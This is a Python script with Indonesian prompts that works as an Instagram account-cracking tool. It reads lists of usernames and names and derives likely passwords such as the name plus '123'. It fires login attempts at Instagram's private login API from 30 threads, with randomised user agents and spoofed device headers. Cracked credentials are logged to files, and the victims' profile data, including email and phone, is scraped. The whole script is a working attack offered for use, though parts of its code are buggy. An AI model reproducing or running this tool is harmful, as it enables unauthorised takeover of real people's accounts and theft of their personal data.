import time,re,json,os
import uuid, sys,base64
import hashlib,datetime
import random,urllib
import requests
from concurrent.futures import ThreadPoolExecutor
X_IG_APP_ID = random.choice(["936619743392459" , "2763362503905702" , "1217981644879628"])
Uid= []
Ok, Cp, Loop = 0, 0, 0
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
ses = requests.Session()
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[str(datetime.datetime.now().month)]
thn = datetime.datetime.now().year
Okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
Cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'

def generate_random_ua():
    devices = ['Android', 'iPhone', 'Windows']
    os_version = random.choice(['10', '11', '12'])
    device_type = random.choice(devices)
    browser_version = random.randint(40, 100)
    ua = f"Mozilla/5.0 ({device_type}; {os_version} OS) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{browser_version}.0.0.0 Mobile Safari/537.36"
    return ua
    
def crack_file():
    os.system('clear')
    file = input(f'Masukan Nama File Yang Di Sdcard Anda : ')
    try:
        uuid = open(file,'r').readlines()
        for data in uuid:
            try:Uid.append(data.strip())
            except:exit(f" [ - ] pemisah salah")
            print('\r sedang dump %s id'%(len(Uid)),end=" ")
            time.sleep(0.0000003)
    except FileNotFoundError:exit(f"File Tidak Terbaca")
    print(f'\rtotal jumlah akun dump adalah {len(Uid)}')
    metode_login()
def metode_login(): 
    print("\nPilih Metode Login:")
    print("1. Login Instagram dengan metode WEBS")
    
    method = input("Pilih metode: ")
    if method == '1':
        login_method = "api.instagram.com"
    else:
        print("Pilihan tidak valid, menggunakan metode default (API).")
        login_method = "api.instagram.com"
    set_crack(login_method)

# Fungsi untuk melakukan proses cracking
def set_crack(login_method):
    print(f"\nMemulai proses crack dengan metode: {login_method}")
    with ThreadPoolExecutor (max_workers=30) as ASF:
        for i in Uid:
            try:
                username, name = i.split('|')
                kontol = Password(name)
                if login_method == "api.instagram.com":
                    ASF.submit(Crack_api, username, kontol)
                else:
                    ASF.submit(Crack_api, username, kontol)
            except:pass
    exit(' \n\n Crack Telah Selesai')
    
def Password(name):
	xxzx = []
	full = name.replace('_', ' ').replace('.', ' ').replace('@', ' ')
	for nama in full.split(' '):
		if len(nama) < 3: 
			continue
		base_nama = nama.replace(' ', '').capitalize()
		xxzx.append(base_nama)
		xxzx.append(base_nama + '01')
		xxzx.append(base_nama + '02')
		xxzx.append(base_nama + '03')
		xxzx.append(base_nama + '04')
		xxzx.append(base_nama + '05')
		xxzx.append(base_nama + '06')
		xxzx.append(base_nama + '07')
		xxzx.append(base_nama + '08')
		xxzx.append(base_nama + '09')
		xxzx.append(base_nama + '10')
		xxzx.append(base_nama + '11')
		xxzx.append(base_nama + '12')
		xxzx.append(base_nama + '13')
		xxzx.append(base_nama + '14')
		xxzx.append(base_nama + '15')
		if len(nama) >= 4:
			xxzx.append(base_nama + '12')        	
			xxzx.append(base_nama + '123')
			xxzx.append(base_nama + '1234')
			xxzx.append(base_nama + '12345')
			xxzx.append(base_nama + '123456')
			xxzx.append(base_nama + '1234567')
			xxzx.append(base_nama + '12345678')
		else:
			xxzx.append('kamu nanya')
			xxzx.append('sayangku123')
			xxzx.append('Bengkulu')
	return xxzx


def convert_cookie(item):
    try:
        sesid = 'sessionid=' + re.findall(r'sessionid=(\d+)', str(item))[0]
        ds_id = 'ds_user_id=' + re.findall(r'ds_user_id=(\d+)', str(item))[0]
        csrft = 'csrftoken=' + re.findall(r'csrftoken=(.*?);', str(item))[0]
        donez = '%s;%s;%s;ig_nrcb=1;dpr=2'%(ds_id, sesid, csrft)
    except Exception as e:
        donez = 'cookies tidak di temukan, error saat convert'
    return donez

def data_target(name):
    for y in name.split(','):
        try:
            HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :'1217981644879628'})
            profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
            post      = profil_info_target["edge_owner_to_timeline_media"]["count"]
            peng  = profil_info_target["edge_followed_by"]["count"]
            meng = profil_info_target["edge_follow"]["count"]
            mail = profil_info_target["business_email"]
            phone = profil_info_target["business_phone_number"]
            fullname = profil_info_target["full_name"]
            fbid = profil_info_target["fbid"]
        except Exception as e:
            post, peng, meng, mail, fullname, fbid, phone = None, None, None, None, None,  None, None
    return post, peng, meng, mail, fullname, fbid, phone

def Crack_api(username, memek):
    global Ok, Cp, Loop
    print(f"Runing {Loop} Collected {str(len(Uid))} Success {Ok} Failed {Cp}", end="\r")
    sys.stdout.flush()
    for password in memek:
        try:
            ses = requests.Session()
            uag = generate_random_ua()
            device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
            _hash = hashlib.md5()
            _hash.update(username.encode('utf-8') + password.encode('utf-8'))
            hex_ = _hash.hexdigest()
            _hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
            ses.headers.update({
                'x-fb-http-engine': 'Liger',
                'Host': 'i.instagram.com',
                'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-device-id': device_id,
                'x-tigon-is-retry': 'True, True',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'connection': 'keep-alive',
                'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
                'x-ig-www-claim': '0',
                'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
                'x-ig-mapped-locale': 'id_ID',
                'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
                'x-ig-app-locale': 'in_ID',
                'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
                'user-agent': uag,
                'x-ig-family-device-id': family_device_id,
                'x-bloks-is-layout-rtl': 'False',
                'x-fb-connection-type': 'MOBILE.LTE',
                'x-fb-server-cluster': 'True',
                'accept-language': 'id-ID, en-US',
                'ig-intended-user-id': '0',
                'x-ig-app-id': '3419628305025917',
                'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
                'priority': 'u=3',
                'x-ig-timezone-offset': str(-time.timezone),
                'x-ig-device-locale': 'in_ID',
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
                'x-fb-client-ip': 'True'
            })
            data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C %22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)
            if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
                Ok += 1
                peng, meng,fullname,= data_target(username)
                print(f"                                                                ", end='\r')
                time.sleep(0.10)
                print(f" [●] Target Data Information")
                print(f"Fullnames : {fullname} ")
                print(f"Usernames : {username} ")
                print(f"Passwords : {password} ")
                print(f"Followers : {peng} ")
                print(f"Following : {meng} ")
                open('RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
                break
            elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
                Cp += 1
                peng, meng, fullname = data_target(username)
                print(f"                                                                ", end='\r')
                time.sleep(0.10)
                print(f" [●] Target Data Information")
                print(f"Fullnames : {fullname} ")
                print(f"Usernames : {username} ")
                print(f"Passwords : {password} ")
                print(f"Followers : {peng} ")
                print(f"Following : {meng} ")
                open('RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(20)
    Loop += 1
 
if __name__ == '__main__':
    crack_file()
